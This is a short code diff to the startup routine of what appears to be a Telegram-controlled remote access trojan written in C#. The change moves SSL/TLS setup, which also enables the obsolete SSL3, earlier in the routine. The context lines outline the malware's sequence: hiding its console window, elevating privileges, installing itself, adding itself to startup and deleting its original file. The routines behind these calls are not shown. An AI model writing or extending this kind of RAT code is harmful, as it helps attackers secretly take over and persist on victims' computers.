@@ -17,10 +17,18 @@ namespace TelegramRAT
         [STAThreadAttribute]
         static void Main(string[] args)
         {
+
             // Hide console
             persistence.HideConsoleWindow();
             // Mutex check
             persistence.CheckMutex();
+            // SSL
+            ServicePointManager.SecurityProtocol = (
+                SecurityProtocolType.Ssl3 |
+                SecurityProtocolType.Tls |
+                SecurityProtocolType.Tls11 |
+                SecurityProtocolType.Tls12
+            );
             // Get admin rights
             persistence.elevatePrevileges();
             // Delay before starting
@@ -31,13 +39,6 @@ namespace TelegramRAT
             persistence.installSelf();
             // Add to startup
             persistence.setAutorun();
-            // SSL
-            ServicePointManager.SecurityProtocol = (
-                SecurityProtocolType.Ssl3 |
-                SecurityProtocolType.Tls |
-                SecurityProtocolType.Tls11 |
-                SecurityProtocolType.Tls12
-            );
             // Delete file after first start
             persistence.MeltFile();
             // Check internet connection
